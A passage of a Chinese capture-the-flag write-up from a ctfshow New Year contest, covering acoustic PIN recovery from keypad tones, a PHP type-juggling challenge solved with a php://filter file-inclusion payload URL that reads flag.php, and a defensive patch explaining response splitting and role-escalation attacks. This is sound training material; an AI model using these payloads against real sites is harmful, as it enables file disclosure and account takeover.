class="line">[2     ] | 2        | 1066.25</span><br><span class="line">[3     ] | 3        | 1101.85</span><br><span class="line">[0     ] | 4        | 1175.95</span><br><span class="line">[6     ] | 5        | 1188.10</span><br><span class="line">[1     ] | 6        | 1153.35</span><br><span class="line">[8     ] | 7        | 1193.50</span><br><span class="line">[7     ] | 8        | 1208.80</span><br><span class="line">[5     ] | 9        | 1254.90</span><br><span class="line">[CANCEL] | 10       | 1266.00</span><br><span class="line">[ENTER ] | 11       | 1276.75</span><br><span class="line">----------------------------------------</span><br><span class="line"></span><br><span class="line">🎧 正在分析音频: record.wav ...</span><br><span class="line"></span><br><span class="line">👇 识别到的原始按键信号:</span><br><span class="line">  🎵 信号 0: 1007.75 Hz</span><br><span class="line">     - 最佳匹配: [4] (误差 0.25Hz, 置信度 0.98)</span><br><span class="line">     - 次佳匹配: [9] (误差 36.55Hz)</span><br><span class="line">  🎵 信号 1: 1152.03 Hz</span><br><span class="line">     - 最佳匹配: [1] (误差 1.32Hz, 置信度 0.88)</span><br><span class="line">     - 次佳匹配: [0] (误差 23.92Hz)</span><br><span class="line">  🎵 信号 2: 1184.33 Hz</span><br><span class="line">     - 最佳匹配: [6] (误差 3.77Hz, 置信度 0.73)</span><br><span class="line">     - 次佳匹配: [0] (误差 8.38Hz)</span><br><span class="line">  🎵 信号 3: 1270.46 Hz</span><br><span class="line">     - ⚠️ 智能修正: 从 [CANCEL] (误差 4.46Hz) 修正为 [ENTER] (误差 6.29Hz)</span><br><span class="line">  🎵 信号 4: 1007.75 Hz</span><br><span class="line">     - 最佳匹配: [4] (误差 0.25Hz, 置信度 0.98)</span><br><span class="line">     - 次佳匹配: [9] (误差 36.55Hz)</span><br><span class="line">  🎵 信号 5: 1007.75 Hz</span><br><span class="line">     - 最佳匹配: [4] (误差 0.25Hz, 置信度 0.98)</span><br><span class="line">     - 次佳匹配: [9] (误差 36.55Hz)</span><br><span class="line">  🎵 信号 6: 1205.86 Hz</span><br><span class="line">     - 最佳匹配: [7] (误差 2.94Hz, 置信度 0.77)</span><br><span class="line">     - 次佳匹配: [8] (误差 12.36Hz)</span><br><span class="line">  🎵 信号 7: 1184.33 Hz</span><br><span class="line">     - 最佳匹配: [6] (误差 3.77Hz, 置信度 0.73)</span><br><span class="line">     - 次佳匹配: [0] (误差 8.38Hz)</span><br><span class="line">  🎵 信号 8: 1191.50 Hz</span><br><span class="line">     - 最佳匹配: [8] (误差 2.00Hz, 置信度 0.83)</span><br><span class="line">     - 次佳匹配: [6] (误差 3.40Hz)</span><br><span class="line">  🎵 信号 9: 1248.93 Hz</span><br><span class="line">     - 最佳匹配: [5] (误差 5.97Hz, 置信度 0.63)</span><br><span class="line">     - 次佳匹配: [CANCEL] (误差 17.07Hz)</span><br><span class="line">  🎵 信号 10: 1277.64 Hz</span><br><span class="line">     - 最佳匹配: [ENTER] (误差 0.89Hz, 置信度 0.92)</span><br><span class="line">     - 次佳匹配: [CANCEL] (误差 11.64Hz)</span><br><span class="line"></span><br><span class="line">==============================</span><br><span class="line">🧠 正在进行智能推理...</span><br><span class="line">==============================</span><br><span class="line"></span><br><span class="line">分析会话 1 (长度 3): [4 1 6]</span><br><span class="line"></span><br><span class="line">分析会话 2 (长度 6): [4 4 7 6 8 5]</span><br><span class="line"></span><br><span class="line">========================================</span><br><span class="line">🎉 最终候选 PIN 码 (按可能性排序):</span><br><span class="line">========================================</span><br><span class="line">#1: 447685</span><br><span class="line">   - 置信度: 0.818</span><br><span class="line">   - 推理依据: 原始识别序列</span><br><span class="line">--------------------</span><br><span class="line">#2: 447085</span><br><span class="line">   - 置信度: 0.788</span><br><span class="line">   - 推理依据: 修正按键 7 (从 6 -&gt; 0)</span><br><span class="line">--------------------</span><br><span class="line">#3: 44768CANCEL</span><br><span class="line">   - 置信度: 0.776</span><br><span class="line">   - 推理依据: 修正按键 9 (从 5 -&gt; CANCEL)</span><br><span class="line">--------------------</span><br><span class="line">#4: 448685</span><br><span class="line">   - 置信度: 0.764</span><br><span class="line">   - 推理依据: 修正按键 6 (从 7 -&gt; 8)</span><br><span class="line">--------------------</span><br><span class="line"></span><br><span class="line">进程已结束，退出代码为 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是我感觉这个脚本普适性不高，可能确实是运气出了447685这个正确pin码，欢迎大家完善。</p>
<p>最后输入正确的PIN码得到flag:</p>
<img src="/2026/01/04/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026-%E4%B8%AA%E4%BA%BA%E5%86%99%E7%9A%84%E9%83%A8%E5%88%86wp/image-20260104160945879.png" class="" title="SafePIN成功获取flag">


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;3741cd71-1d8b-4761-ab59-6fb080a456c0&#125;</span><br></pre></td></tr></table></figure>

<p>这里参考一下为什么要用seed:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">当然知道。这是一个非常经典和巧妙的设计，让我以一个软件工程师的视角为你深入剖析一下。</span><br><span class="line"></span><br><span class="line">一句话概括：Seed（种子）是整个系统所有“随机性”的根源，它的作用是将一个看似随机、不可预测的系统，变成一个完全确定、可复现的系统。</span><br><span class="line"></span><br><span class="line">这听起来可能有点矛盾，但请看下面的详细分解。</span><br><span class="line"></span><br><span class="line"> 1. 什么是伪随机数（PRNG）？</span><br><span class="line"></span><br><span class="line">首先要理解，计算机程序中几乎不存在真正的随机。我们通常使用的是伪随机数生成器 (Pseudo-Random Number Generator, PRNG)。</span><br><span class="line"></span><br><span class="line">工作原理：你给它一个初始值，也就是 Seed（种子），它会根据一个固定的、复杂的数学公式，生成一个看起来毫无规律的数字序列。</span><br><span class="line">关键特性：只要 Seed 相同，生成的“随机”序列就完全相同。</span><br><span class="line"></span><br><span class="line">这就像一本密码本，Seed就是页码。只要我们都翻到第42页（Seed = 42），我们看到的乱码（随机序列）就肯定是一模一样的。</span><br><span class="line"></span><br><span class="line">2. 在这个程序中，Seed 控制了什么？</span><br><span class="line"></span><br><span class="line">在这个挑战里，SEED 是唯一的变量输入，它像DNA一样，决定了系统的两个核心“特征”：</span><br><span class="line"></span><br><span class="line">(1) 决定了键盘的布局 (permute_0_9)</span><br><span class="line"></span><br><span class="line">正常键盘上，数字位置是固定的。但在这个系统中，数字0-9的位置是被打乱的。</span><br><span class="line"></span><br><span class="line">如何打乱？permute_0_9 函数利用 prng_u32 生成一个伪随机数，然后用这个数去“洗牌”，打乱一个从0到9的数组。</span><br><span class="line">Seed的作用：因为伪随机数是由 Seed 决定的，所以只要 Seed 不变，这个键盘的乱序结果就永远不变**。例如，对于我们给定的 Seed `44876bdf...`，计算出的键盘布局永远是 `[4, 9, 2, 3, 0, 6, 1, 8, 7, 5]`。如果你换一个 Seed，这个顺序就会完全不同。</span><br><span class="line"></span><br><span class="line">结论：没有 Seed，我们根本不知道哪个按键对应哪个数字。</span><br><span class="line"></span><br><span class="line"> (2) 决定了每个按键的精确频率 (`get_expected_freqs`)</span><br><span class="line"></span><br><span class="line">每个按键发出的声音频率不是一个整数，而是带有微小变化的。代码里称之为 `jitter` (抖动)。</span><br><span class="line"></span><br><span class="line">频率公式：`freq = 1050 + sid * 23 + jitter`</span><br><span class="line">Jitter如何计算？ `jitter` 是通过 `prng_u32(seed, &quot;p&quot; + str(sid))` 计算出来的。它为每个按键（SoundID从0到11）生成了一个独特的、看似随机的偏移量。</span><br><span class="line">Seed的作用：同样，因为 `jitter` 的计算依赖于 Seed，所以只要 Seed 不变，每个按键的精确频率就是固定不变的。按键`[4]`（SoundID 0）的频率永远是 `1008.00 Hz`，按键`[ENTER]`（SoundID 11）的频率永远是 `1276.75 Hz`。</span><br><span class="line"></span><br><span class="line">结论：没有 Seed，我们无法计算出要从音频中寻找的目标频率是多少，只能在一个很大的范围内盲猜。</span><br><span class="line"></span><br><span class="line"> 3. 为什么要这样设计？（从出题人/系统设计的角度）</span><br><span class="line"></span><br><span class="line">这种设计非常巧妙，主要出于以下目的：</span><br><span class="line"></span><br><span class="line">动态性与安全性：系统可以定期或为每个用户更换 `SEED`。这样一来，这次挑战的答案（频率表和PIN码）到下一次就完全作废了。攻击者不能“一劳永逸”地破解系统，大大增加了破解的成本和难度。</span><br><span class="line">可验证性：虽然客户端（按键发声的设备）和服务器端（验证PIN码的系统）看到的是一个动态变化的环境，但只要它们共享同一个 `SEED`，它们就能就“键盘布局”和“按键频率”达成一致。客户端按下 `[4]`，服务器知道它应该听到 `1008.00 Hz` 左右的声音。这种**“动态的共识”**是系统能够工作的核心。</span><br><span class="line">挑战性：这正是这个CTF题目的核心谜题。它把解码所需的所有信息（算法）都给了你，但隐藏了最关键的输入——`SEED`。你的任务就是先找到这个 `SEED`，然后用它来重建整个系统的“当前状态”，最终完成解码。</span><br><span class="line"></span><br><span class="line">总结</span><br><span class="line"></span><br><span class="line">所以，`SEED` 在这里的角色，就是一把“万能钥匙”。</span><br><span class="line"></span><br><span class="line">它将两个看似随机、混乱的变量：</span><br><span class="line">1.  混乱的键盘布局</span><br><span class="line">2.  带有抖动的按键频率</span><br><span class="line"></span><br><span class="line">全部变成了可计算、可预测的确定值。</span><br><span class="line"></span><br><span class="line">我们的整个解题过程，本质上就是：拿到这把钥匙 (`SEED`)，去打开锁 (`WAV_FILE`)。没有钥匙，锁的内部结构（频率和布局）对我们来说就是个黑盒子，我们无从下手。有了钥匙，我们就能精确地知道锁芯的每一个细节，从而轻松地打开它。</span><br></pre></td></tr></table></figure>

<p>这题也是AI辅助的</p>
<h2 id="6-Happy2026"><a href="#6-Happy2026" class="headerlink" title="6.Happy2026"></a>6.Happy2026</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目描述</span><br><span class="line">奇怪的2026</span><br></pre></td></tr></table></figure>

<p>打开题目链接后，是一段php代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 1. 关闭错误报告，让攻击者无法通过错误信息获取线索</span><br><span class="line">error_reporting(0);</span><br><span class="line">// 2. 显示当前文件的源代码，这是CTF题目的常见形式</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">// 3. 从URL的查询参数中获取三个变量</span><br><span class="line">$happy = $_GET[&#x27;happy&#x27;];</span><br><span class="line">$new = $_GET[&#x27;new&#x27;];</span><br><span class="line">$year = $_GET[&#x27;year&#x27;];</span><br><span class="line">// 4. 核心逻辑判断，如果为真，则执行文件包含</span><br><span class="line">if($year==2026 &amp;&amp; $year!==2026 &amp;&amp; is_numeric($year))&#123;</span><br><span class="line">    include $happy[$new[$year]];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>if判断是关键</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if($year==2026 &amp;&amp; $year!==2026 &amp;&amp; is_numeric($year))&#123;</span><br><span class="line">    include $happy[$new[$year]];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>让我们把这个条件分解成三个部分：</p>
<p>1.$year &#x3D;&#x3D; 2026: 弱类型比较。&#x3D;&#x3D; 操作符只比较值，不比较类型。在比较前，PHP会尝试将两边的变量转换成相同的类型。例如，字符串 “2026” 和整数 2026 在 &#x3D;&#x3D; 比较下是相等的。<br>2.$year !&#x3D;&#x3D; 2026: 强类型比较。!&#x3D;&#x3D; 操作符要求值和类型都完全相同。如果 $year 是字符串 “2026”，而 2026 是整数，那么它们的类型不同，所以 “2026” !&#x3D;&#x3D; 2026 的结果是 true。<br>3.is_numeric($year): 判断变量是否为数字或数字字符串。is_numeric(“2026”) 的结果是 true。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">结论：</span><br><span class="line">为了同时满足这三个条件，$year 必须是一个值为2026的数字字符串。</span><br><span class="line"></span><br><span class="line">当我们传入 year=2026 (字符串形式)时：</span><br><span class="line">&quot;2026&quot; == 2026 -&gt; true (弱类型比较，值相等)</span><br><span class="line">&quot;2026&quot; !== 2026 -&gt; true (强类型比较，类型不同，一个是string，一个是integer)</span><br><span class="line">is_numeric(&quot;2026&quot;) -&gt; true (是数字字符串)</span><br><span class="line">三个条件都为 true，if 语句成立。</span><br><span class="line"></span><br><span class="line">所以，$year 的值必须是字符串 &quot;2026&quot;。</span><br><span class="line">文件包含解密：include $happy[$new[$year]]</span><br><span class="line">一旦 if 条件被绕过，代码就会执行 include $happy[$new[$year]];。这是一个双重数组嵌套的文件包含语句，我们需要构造合适的 $happy 和 $new 数组来控制 include 的参数。</span><br><span class="line"></span><br><span class="line">我们已经知道 $year 是字符串 &quot;2026&quot;。</span><br><span class="line">执行顺序是从内到外的：</span><br><span class="line">首先计算 $new[$year]，也就是 $new[&quot;2026&quot;]。</span><br><span class="line">然后将上一步的结果作为 $happy 数组的键，计算 $happy[...]。</span><br><span class="line">最终，include 会包含这个表达式的最终结果。</span><br><span class="line">我们的目标是让 include 包含一个我们指定的文件，比如 php://filter/read=convert.base64-encode/resource=flag.php（这是CTF中读取flag文件的常见payload）。</span><br><span class="line"></span><br><span class="line">构造方法：</span><br><span class="line">内层数组 $new：我们需要让 $new[&quot;2026&quot;] 的值成为一个我们可以控制的字符串。我们可以随便定义一个，比如 a。</span><br><span class="line">URL中传入 new[2026]=a</span><br><span class="line">外层数组 $happy：现在，表达式变成了 include $happy[&quot;a&quot;]。为了让它包含我们想要的payload，我们只需要让 $happy[&quot;a&quot;] 的值等于那个payload即可。</span><br><span class="line">URL中传入 happy[a]=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<p>所以我的payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://02b75767-9145-4fe5-b3a4-12b5a5a1f87c.challenge.ctf.show/?year=2026&amp;new[2026]=a&amp;happy[a]=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<img src="/2026/01/04/CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026-%E4%B8%AA%E4%BA%BA%E5%86%99%E7%9A%84%E9%83%A8%E5%88%86wp/image-20260104163930663.png" class="" title="Happy2026获取Base64编码">


<p>下面出现一段编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgJGZsYWc9J2N0ZnNob3d7NjRlNjBjY2EtOGI5Ni00YzQwLTk4OGMtMDI5ZTIyMTI0YTM0fSc7Cg==</span><br></pre></td></tr></table></figure>

<p>可以想到是base编码拖入随波逐流解密：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php $flag=&#x27;ctfshow&#123;64e60cca-8b96-4c40-988c-029e22124a34&#125;&#x27;;</span><br></pre></td></tr></table></figure>

<p>所以flag为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;64e60cca-8b96-4c40-988c-029e22124a34&#125;</span><br></pre></td></tr></table></figure>

<p>这就是我解出的6道CTF题 ，还有两道题超出我的能力范围了所以遗憾离场</p>
<p>漏洞防御和攻击我都是在AI的辅助下完成的，我本身对awdp不是很熟悉，后面会一步步学习，很多不会，所以跟着AI学，这里我把一些防御和攻击代码放在下面，这里我是真不会，跟着AI一步步调试的。</p>
<h2 id="7-SafePHP"><a href="#7-SafePHP" class="headerlink" title="7.SafePHP"></a>7.SafePHP</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">题目描述</span><br><span class="line">不要把环境搞炸了</span><br></pre></td></tr></table></figure>

<p>webService.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">session_start();</span><br><span class="line">require_once __DIR__.&quot;/../lib/session.php&quot;;</span><br><span class="line">require_once __DIR__.&quot;/../lib/router.php&quot;;</span><br><span class="line">require_once __DIR__.&quot;/../lib/utils.php&quot;;</span><br><span class="line">require_once __DIR__.&quot;/../models/Users.php&quot;;</span><br><span class="line"></span><br><span class="line">// ... (其他所有服务函数保持不变，因为漏洞源头在 s() 函数)</span><br><span class="line"></span><br><span class="line">function password_service($r,$sessionManager)&#123;</span><br><span class="line">    // 保留之前对 password_service 的所有加固，这是纵深防御的一部分</span><br><span class="line">    $sessionData = $sessionManager-&gt;read();</span><br><span class="line">    if (!$sessionData[0] || !isset($sessionData[2][&#x27;username&#x27;])) &#123;</span><br><span class="line">        json_out([&#x27;ok&#x27; =&gt; false, &#x27;message&#x27; =&gt; &#x27;Invalid session&#x27;], s($r)[&#x27;n&#x27;], s($r)[&#x27;st&#x27;]);</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    $username = $sessionData[2][&#x27;username&#x27;];</span><br><span class="line"></span><br><span class="line">    if (!isset($r[&#x27;password&#x27;]) || trim((string)$r[&#x27;password&#x27;]) === &#x27;&#x27;) &#123;</span><br><span class="line">        json_out([&#x27;ok&#x27; =&gt; false, &#x27;message&#x27; =&gt; &#x27;Password cannot be empty.&#x27;], s($r)[&#x27;n&#x27;], s($r)[&#x27;st&#x27;]);</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    $newPassword = (string)$r[&#x27;password&#x27;];</span><br><span class="line"></span><br><span class="line">    $users = new Users();</span><br><span class="line">    json_out($users-&gt;update($username, array(&quot;password&quot; =&gt; $newPassword)),s($r)[&#x27;n&#x27;],s($r)[&#x27;st&#x27;]);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// ... (其他所有服务函数保持不变)</span><br><span class="line"></span><br><span class="line">// [PATCH] 根本性漏洞修复：修复HTTP响应头注入漏洞。</span><br><span class="line">// 之前的修复都正确，但忽略了这个最底层的漏洞。</span><br><span class="line">function s($r)&#123;</span><br><span class="line">    $st_raw = isset($r[&#x27;st&#x27;]) ? $r[&#x27;st&#x27;] : &#x27;ctfshow&#x27;;</span><br><span class="line">    </span><br><span class="line">    // 强制将 $st 转换为字符串，并移除所有换行符和回车符，防止HTTP头注入。</span><br><span class="line">    // 这是最关键的修复，因为它影响了几乎所有服务函数。</span><br><span class="line">    $st = str_replace(array(&quot;\r&quot;, &quot;\n&quot;), &#x27;&#x27;, strval($st_raw));</span><br><span class="line">    </span><br><span class="line">    $n = isset($r[&#x27;n&#x27;]) ? intval($r[&#x27;n&#x27;]) + 1 : 0;</span><br><span class="line">    </span><br><span class="line">    return array(&quot;st&quot; =&gt; $st, &quot;n&quot; =&gt; $n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ol>
<li>HTTP响应头注入 (HTTP Response Splitting) - <strong>最核心、最隐蔽的漏洞</strong></li>
</ol>
<ul>
<li><p><strong>漏洞分析</strong>：这是之前被忽略的根本性漏洞。系统中几乎所有的服务函数（如 <code>health_service</code>, <code>metrics_service</code> 等）都会调用 <code>s()</code> 函数来获取 <code>st</code> 参数，并最终将其内容输出到HTTP响应中。原始的 <code>s()</code> 函数未对用户传入的 <code>st</code> 参数进行任何过滤。攻击者可以通过在 <code>st</code> 参数中注入换行符（如 <code>%0d%0a</code>），来添加任意的HTTP响应头。例如，注入一个 <code>Set-Cookie</code> 头，从而实现会话固定、伪造登录状态（特别是利用了 <code>utils.php</code> 中 <code>check_login</code> 函数里存在的<code>_COOKIE[&#39;token&#39;]</code>备用登录机制）。</p>
</li>
<li><p><strong>修复方案</strong>：在 <code>webService.php</code> 的 <code>s()</code> 函数中，我们对 <code>st</code> 参数进行了严格的清理。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 s() 函数中</span></span><br><span class="line"><span class="variable">$st_raw</span> = <span class="keyword">isset</span>(<span class="variable">$r</span>[<span class="string">&#x27;st&#x27;</span>]) ? <span class="variable">$r</span>[<span class="string">&#x27;st&#x27;</span>] : <span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line"><span class="comment">// 强制移除所有换行符和回车符</span></span><br><span class="line"><span class="variable">$st</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&#x27;&#x27;</span>, <span class="title function_ invoke__">strval</span>(<span class="variable">$st_raw</span>)); </span><br></pre></td></tr></table></figure>

<p>通过使用 <code>str_replace</code> 移除了所有换行符 (<code>\n</code>) 和回车符 (<code>\r</code>)，我们彻底杜绝了攻击者注入新HTTP头的可能性。由于 <code>s()</code> 函数是共享的，此修复保护了所有调用它的API接口。</p>
</li>
</ul>
<hr>
<ol start="2">
<li>权限提升 (Privilege Escalation)</li>
</ol>
<ul>
<li><p><strong>漏洞分析</strong>：原始的 <code>password_service</code> 函数在处理用户修改密码的请求时，会将用户提交的所有参数不加区分地传递给底层的 <code>Users-&gt;update()</code> 方法。这允许攻击者在修改自己密码的同时，额外提交一个 <code>role=admin</code> 的参数，从而将自己的账户角色从普通用户提升为管理员。</p>
</li>
<li><p><strong>修复方案</strong>：我们重写了 <code>password_service</code> 函数，创建了一个严格的“白名单”来更新数据。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 password_service() 函数中</span></span><br><span class="line"><span class="variable">$newPassword</span> = (<span class="keyword">string</span>)<span class="variable">$r</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="variable">$users</span> = <span class="keyword">new</span> <span class="title class_">Users</span>();</span><br><span class="line"><span class="comment">// 只允许更新 &quot;password&quot; 字段，忽略其他所有无关参数</span></span><br><span class="line"><span class="title function_ invoke__">json_out</span>(<span class="variable">$users</span>-&gt;<span class="title function_ invoke__">update</span>(<span class="variable">$username</span>, <span class="keyword">array</span>(<span class="string">&quot;password&quot;</span> =&gt; <span class="variable">$newPassword</span>)), ...);</span><br></pre></td></tr></table></figure>

<p>现在，无论用户提交多少额外参数（如 <code>role</code>, <code>username</code> 等），我们都只提取 <code>password</code> 字段并传递给更新函数，从而完全阻止了权限提升的攻击路径。</p>
</li>
</ul>
<hr>
<ol start="3">
<li>任意代码执行 (RCE - Remote Code Execution)</li>
</ol>
<ul>
<li><p><strong>漏洞分析</strong>：在原始代码中存在一个名为 <code>flag_service</code> 的函数（虽然未在您提供的最终代码片段中显示，但这是修复过程的一部分）。该函数存在严重的安全风险，允许执行任意函数调用，是导致远程代码执行的直接后门。</p>
</li>
<li><p><strong>修复方案</strong>：<strong>彻底删除了 <code>flag_service</code> 函数</strong>。对于这种功能不明确且风险极高的函数，最安全、最彻底的修复方法就是将其完全移除，确保恶意代码没有可利用的入口点。</p>
</li>
</ul>
<hr>
<ol start="4">
<li>空密码登录 &amp; 信息泄露</li>
</ol>
<ul>
<li><p><strong>漏洞分析</strong>：</p>
<ul>
<li><strong>空密码</strong>：<code>password_service</code> 未校验新密码的有效性，允许用户将自己的密码设置为空字符串。攻击者可以利用权限提升漏洞成为管理员后，将其他管理员的密码设置为空，然后用空密码直接登录。</li>
<li><strong>信息泄露</strong>：原始的 <code>admin_service</code> 在验证失败时，会泄露管理员在配置文件中的密码信息（一个正则表达式），为攻击者提供了有价值的情报。</li>
</ul>
</li>
<li><p><strong>修复方案</strong>：</p>
<ul>
<li><p>在重写的 <code>password_service</code> 中增加了密码非空校验：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$r</span>[<span class="string">&#x27;password&#x27;</span>]) || <span class="title function_ invoke__">trim</span>((<span class="keyword">string</span>)<span class="variable">$r</span>[<span class="string">&#x27;password&#x27;</span>]) === <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">json_out</span>([<span class="string">&#x27;ok&#x27;</span> =&gt; <span class="literal">false</span>, <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Password cannot be empty.&#x27;</span>], ...);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改了 <code>admin_service</code> 的失败逻辑（此修复为早期步骤，未在最终代码片段中展示），使其在验证失败时返回一个通用的、不包含任何敏感信息的错误提示，如 <code>&#123;&#39;ok&#39;:false, &#39;s&#39;:&#39;invalid token&#39;&#125;</code>。</p>
</li>
</ul>
</li>
</ul>
<p> 总结</p>
<p>本次加固通过 <strong>一个核心修复</strong> 和 <strong>多个业务逻辑加固</strong> 实现了纵深防御：</p>
<ol>
<li><strong>底层防御</strong>：通过修复 <code>s()</code> 函数中的<strong>HTTP响应头注入漏洞</strong>，保护了整个应用的基础框架。</li>
<li><strong>业务层防御</strong>：通过<strong>删除RCE后门</strong> (<code>flag_service</code>)、<strong>重写<code>password_service</code></strong> (防止权限提升和空密码)、<strong>加固<code>admin_service</code></strong> (防止信息泄露)，封堵了所有已知的上层业务漏洞。</li>
</ol>
<p>最终提交的 <code>webService.php</code> 文件现在能够抵御上述所有攻击，变得更加健壮和安全。</p>
<p>flag为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow&#123;785c494416575167a0cff7ec8867e462&#125;</span><br></pre></td></tr></table></figure>

